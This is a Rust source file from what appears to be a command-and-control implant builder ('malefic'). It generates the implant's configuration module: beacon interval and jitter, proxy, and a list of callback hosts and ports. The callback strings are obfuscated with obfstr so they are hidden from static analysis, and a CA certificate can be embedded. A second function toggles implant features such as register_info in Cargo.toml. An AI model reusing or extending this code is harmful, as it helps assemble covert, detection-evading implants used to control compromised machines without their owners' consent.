use std::fs;
use std::fs::File;
use std::io::Write;
use toml_edit::{Array, DocumentMut, Item};
use crate::{FEATURES, ImplantConfig, Service};

lazy_static! {
        static ref CONFIG_FILE_GENE_PATH : &'static str = "malefic/src/config/mod.rs";
}

pub fn update_core(server: Service) {
    let mut file = File::create(CONFIG_FILE_GENE_PATH.to_string()).unwrap();

    let mut buf = std::format!(
        "use lazy_static::lazy_static;\n\
        lazy_static! (\n\
        \tpub static ref INTERVAL: u64 = {};\n\
        \tpub static ref JITTER: u64 = {};\n\
        \tpub static ref NAME: String = obfstr::obfstr!(\"{}\").to_string();\n\
        \tpub static ref PROXY: String = obfstr::obfstr!(\"{}\").to_string();\n",
        server.interval,
        server.jitter,
        server.name,
        server.proxy,
    );
    let mut url_templete: String = "\tpub static ref URLS: Vec<(String, u16)> = vec![\n".to_string();

    for url in server.urls.iter() {
        let ip = url.split(":").collect::<Vec<&str>>()[0];
        let port = url.split(":").collect::<Vec<&str>>()[1];
        url_templete.push_str(&format!("\t\t(obfstr::obfstr!(\"{}\").to_string(), {}),\n", ip, port));
    }
    url_templete.push_str("\t];\n");
    buf.push_str(&url_templete);
    buf.push_str(");\n");
    
    if server.ca.is_empty() {
        buf.push_str("pub static CA: &'static [u8] = vec![1;0];");
    } else {
        let ca = std::format!(
            "pub static CA: &'static [u8] = include_bytes!(\"{}\");",
            server.ca
        );
        buf.push_str(&ca);
    }


    file.write(buf.as_bytes()).expect("write config file error");
}


pub fn update_core_toml(cargo_toml_path: &str,implant_config: ImplantConfig, professional: bool) {
    let cargo_toml_content = fs::read_to_string(cargo_toml_path)
        .expect("Failed to read Cargo.toml file");

    let mut cargo_toml: DocumentMut = cargo_toml_content.parse()
        .expect("Failed to parse Cargo.toml file");

    if let Some(features) = cargo_toml[&FEATURES].as_table_mut() {
        let mut default_array = features[&"template"].as_array_mut().unwrap().clone();

        if implant_config.register_info {
            default_array.push("register_info".to_string());
        }
        features[&"default"] = Item::Value(default_array.into());
    }

    fs::write(cargo_toml_path, cargo_toml.to_string())
        .expect("Failed to write updated Cargo.toml file");

    println!("Cargo.toml file {:#?} has been updated.", cargo_toml_path);
}
